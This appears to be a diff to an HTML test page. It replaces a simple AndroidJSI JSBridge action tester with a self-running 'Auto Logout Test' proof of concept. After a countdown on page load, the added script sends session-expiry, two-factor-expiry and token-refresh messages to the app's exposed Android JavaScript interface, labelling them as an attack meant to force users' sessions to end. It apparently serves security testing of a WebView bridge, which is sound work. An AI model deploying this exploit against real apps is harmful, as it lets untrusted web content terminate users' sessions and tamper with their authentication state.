@@ -1,53 +1,177 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>AndroidJSI Test Page</title>
+    <title>Auto Logout Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: #000;
+            color: #ff0000;
+            text-align: center;
+        }
+        .critical {
+            background-color: #330000;
+            border: 3px solid #ff0000;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 10px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.5; }
+        }
+        .log {
+            background-color: #111;
+            border: 1px solid #333;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            font-family: monospace;
+            text-align: left;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        h1 {
+            color: #ff6666;
+            font-size: 24px;
+        }
+        .status {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .countdown {
+            font-size: 36px;
+            color: #ff0000;
+            margin: 20px 0;
+        }
+    </style>
 </head>
 <body>
-  <h2>AndroidJSI JSBridge Action Tester</h2>
-  <button onclick="testAll()">Trigger All Actions</button>
-  <pre id="log" style="white-space: pre-wrap; background: #f4f4f4; padding: 10px;"></pre>
+    <h1>🚨 AUTO LOGOUT TEST 🚨</h1>
+    
+    <div class="critical">
+        <h2>⚠️ CRITICAL SESSION ACTIONS</h2>
+        <p>This page will automatically trigger session termination actions</p>
+        <div class="countdown" id="countdown">5</div>
+        <p>Preparing to execute critical JSBridge actions...</p>
+    </div>
+    
+    <div class="status" id="status">
+        Initializing attack sequence...
+    </div>
+    
+    <div class="log" id="log">
+        <div>🔓 Auto Logout Test initialized</div>
+        <div>🎯 Target: User session termination</div>
+        <div>⚡ Critical actions queued for execution</div>
+    </div>
 
-  <script>
-    const actions = [
-      "BACK",
-      "SHARE",
-      "DEEPLINK",
-      "ORIENTATION_CHANGE",
-      "WEBVIEW_LOADER_STOP",
-      "EXTERNAL_AP_LINK",
-      "REDIRECT_TO_SETTINGS",
-      "BUZZ_QUERY_CLICKED",
-      "SESSION_EXPIRED",
-      "TWO_FACTOR_EXPIRE",
-      "WEBVIEW_INTERACTABLE",
-      "WEBVIEW_FCP",
-      "WEBVIEW_FAILURE",
-      "WEBVIEW_SUCCESS",
-      "ACCESS_TOKEN_REFRESH_TOKEN_UPDATE"
-    ];
-
-    function log(msg) {
-      document.getElementById("log").textContent += msg + "\n";
-    }
-
-    function testAction(action, payload = "{}") {
-      log(`Triggering: ${action}`);
-      try {
-        AndroidJSI.onReceiveMessage(JSON.stringify({
-          action: action,
-          data: payload
-        }));
-      } catch (e) {
-        log(`Error: ${e.message}`);
-      }
-    }
-
-    function testAll() {
-      for (const action of actions) {
-        testAction(action, `{"test":"value"}`);
-      }
-    }
-  </script>
+    <script>
+        let logContainer = document.getElementById('log');
+        let statusContainer = document.getElementById('status');
+        let countdownContainer = document.getElementById('countdown');
+        
+        function log(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            logContainer.innerHTML += `<div>[${timestamp}] ${message}</div>`;
+            logContainer.scrollTop = logContainer.scrollHeight;
+            console.log(message);
+        }
+        
+        function updateStatus(message) {
+            statusContainer.textContent = message;
+            log(`STATUS: ${message}`);
+        }
+        
+        function triggerCriticalAction(action, delay = 0) {
+            setTimeout(() => {
+                log(`🚨 EXECUTING CRITICAL ACTION: ${action}`);
+                
+                try {
+                    if (typeof window.AndroidJSI !== 'undefined') {
+                        const payload = JSON.stringify({
+                            action: action,
+                            data: "auto_logout_attack"
+                        });
+                        
+                        window.AndroidJSI.onReceiveMessage(payload);
+                        log(`✅ Successfully triggered: ${action}`);
+                        updateStatus(`Executed: ${action}`);
+                    } else {
+                        log(`❌ AndroidJSI not available for: ${action}`);
+                        updateStatus(`Failed: AndroidJSI not found`);
+                    }
+                } catch (e) {
+                    log(`❌ Error executing ${action}: ${e.message}`);
+                    updateStatus(`Error: ${e.message}`);
+                }
+            }, delay);
+        }
+        
+        function startCountdown() {
+            let count = 5;
+            countdownContainer.textContent = count;
+            
+            const countdownInterval = setInterval(() => {
+                count--;
+                countdownContainer.textContent = count;
+                
+                if (count <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownContainer.textContent = "EXECUTING!";
+                    executeAttack();
+                }
+            }, 1000);
+        }
+        
+        function executeAttack() {
+            log("🚀 Starting critical action sequence...");
+            updateStatus("ATTACK IN PROGRESS");
+            
+            // Execute the 3 critical actions with small delays
+            triggerCriticalAction("SESSION_EXPIRED", 500);
+            triggerCriticalAction("TWO_FACTOR_EXPIRE", 1500);
+            triggerCriticalAction("ACCESS_TOKEN_REFRESH_TOKEN_UPDATE", 2500);
+            
+            // Final status update
+            setTimeout(() => {
+                log("🏁 All critical actions executed");
+                updateStatus("ATTACK COMPLETED - Check if user is logged out");
+                
+                // Change UI to show completion
+                document.body.style.backgroundColor = "#001100";
+                countdownContainer.textContent = "DONE!";
+                countdownContainer.style.color = "#00ff00";
+            }, 3500);
+        }
+        
+        // Auto-start when page loads
+        window.addEventListener('load', function() {
+            log("🔓 Auto Logout Test page loaded");
+            log(`🎯 Current URL: ${window.location.href}`);
+            log("⏱️ Starting countdown to critical action execution");
+            
+            updateStatus("Countdown started - Critical actions will execute automatically");
+            
+            // Start countdown after 2 seconds
+            setTimeout(() => {
+                startCountdown();
+            }, 2000);
+        });
+        
+        // Monitor for any session changes
+        setInterval(() => {
+            if (typeof window.AndroidJSI !== 'undefined') {
+                // JSBridge still available
+            } else {
+                log("⚠️ AndroidJSI interface lost - possible session termination");
+            }
+        }, 5000);
+    </script>
 </body>
 </html>
